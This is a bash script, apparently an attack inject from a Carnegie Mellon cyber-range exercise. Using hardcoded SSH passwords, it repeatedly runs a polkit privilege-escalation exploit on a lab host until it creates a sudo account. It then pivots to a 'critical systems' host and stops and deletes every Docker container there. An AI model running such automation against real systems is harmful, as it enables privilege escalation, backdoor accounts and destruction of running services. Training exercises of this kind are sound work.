#!/bin/bash

# Copyright 2023 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

#Let's Go
echo `date` ": Starting Inject" >> /home/user/Desktop/finals/log.txt

#Validate networking
ping -c 4 10.10.10.1 > /dev/null

while [ $? -eq 1 ]
do
    echo "tartans" | sudo -S ifconfig eth0 10.10.10.122/24
    # echo "tartans" | sudo -S route add default gw 10.10.10.1
    echo "tartans" | sudo -S ip route add 10.5.5.0/24 via 10.10.10.1 dev eth0
    ping -c 4 10.10.10.1 > /dev/null
done

while true
do
    ping -c 4 10.10.10.1 > /dev/null

    while [ $? -eq 0 ]
    do
        echo `date` ": Networking looks good" >> /home/user/Desktop/finals/log.txt

        #Test if SMB is available
        echo `date` ": Checking if SMB is available, loop if not" >> /home/user/Desktop/finals/log.txt

        nc -zv 10.5.5.19 445 > /dev/null

        while [ $? -eq 1 ]
        do
            echo `date` ": Waiting for SMB"
            sleep 2
            nc -zv 10.5.5.19 445  > /dev/null
        done

        #Test download of language file
        echo `date` ": SMB share accessible, trying to access dictionary file, loop if not" >> /home/user/Desktop/finals/log.txt

        while [ ! -f /home/user/Desktop/finals/dictionary.zip ]
        do 
            smbget -a smb://10.5.5.19/AlienLanguageShare/Galactic_STD_English_Reference.zip -o /home/user/Desktop/finals/dictionary.zip
            echo `date` ": Waiting for dictionary file access"
        done

        echo `date` ": Successfully retrieved language file" >> /home/user/Desktop/finals/log.txt

        #Update status file for GameBrain
        echo '{"LanguageFile": "success"}' > /home/user/LanguageFile
        echo `date` ": Status file updated to show as passed" >> /home/user/Desktop/finals/log.txt

        #Verify ssh is accessible
        echo `date` ": Checking if SSH is available, loop if not" >> /home/user/Desktop/finals/log.txt

        nc -zv 10.5.5.19 22 > /dev/null

        while [ $? -eq 1 ]
        do
            echo `date` ": Waiting for SSH to be available"
            sleep 2
            nc -zv 10.5.5.19 22 > /dev/null
        done
    
        sshpass -p phantom ssh -o StrictHostKeyChecking=no pirate@10.5.5.19 'exit' 2>&1 | tee /home/user/Desktop/finals/ssh-status.txt
        sleep 2
    
        while grep -q "Permission denied" /home/user/Desktop/finals/ssh-status.txt;
        do

            #If successful, run polkit exploit and repeat until successful
            echo `date` ": Beginning exploit process" >> /home/user/Desktop/finals/log.txt

            while ! grep -q "Inserted Username pirate" /home/user/Desktop/finals/polkit-status.txt;
            do
                sleep 2
                echo `date` ": Attempting polkit exploit"
                sshpass -p tartans ssh -o StrictHostKeyChecking=no user@10.5.5.19 < /home/user/Desktop/finals/polkit-exploit.sh > /home/user/Desktop/finals/polkit-status.txt
            done

            echo `date` ": Exploit successful, sudo account created" >> /home/user/Desktop/finals/log.txt

            #Once successful, ssh in using exploit creds and exit to check status of account

            echo `date` ": Testing SSH login." >> /home/user/Desktop/finals/log.txt

            sshpass -p phantom ssh -o StrictHostKeyChecking=no pirate@10.5.5.19 'exit' 2>&1 | tee /home/user/Desktop/finals/ssh-status.txt
            sleep 2

            #Check if password fails, run polkit exploit again to set password, and test again
            echo `date` ": Initial password setting failed, trying again" >> /home/user/Desktop/finals/log.txt

            while grep -q "Permission denied" /home/user/Desktop/finals/ssh-status.txt;
            do
                sshpass -p tartans ssh -o StrictHostKeyChecking=no user@10.5.5.19 < /home/user/Desktop/finals/polkit-exploit.sh > /home/user/Desktop/finals/polkit-status.txt
                sleep 2
                sshpass -p phantom ssh -o StrictHostKeyChecking=no pirate@10.5.5.19 'exit' 2>&1 | tee /home/user/Desktop/finals/ssh-status.txt
                sleep 2
            done
        done
        
        #Retry ssh and run attacks
        echo `date` ": SSH login with new privileged account successful" >> /home/user/Desktop/finals/log.txt

        nc -zv 10.5.5.19 22 > /dev/null

        while [ $? -eq 1 ]
        do
            echo `date` ": Waiting for SSH to be available"
            sleep 2
            nc -zv 10.5.5.19 22  > /dev/null
        done

        echo `date` ": Waiting for showtime" >> /home/user/Desktop/finals/log.txt
        sleep 10  #Add delay value hre

        echo `date` ": Hold on to your butts..." >> /home/user/Desktop/finals/log.txt


        #Commands will stop and then remove all running docker containers on the critical ship systems VM fo effect. 
        sshpass -p tartans ssh -o StrictHostKeyChecking=no user@10.5.5.19 'ssh user@ship-critical-systems.us "docker stop \$(docker ps -a -q)"'
        sshpass -p tartans ssh -o StrictHostKeyChecking=no user@10.5.5.19 'ssh user@ship-critical-systems.us "docker rm \$(docker ps -a -q)"'

        echo `date` : "Attacks Complete" >> /home/user/Desktop/finals/log.txt
    done
    sleep 5
done
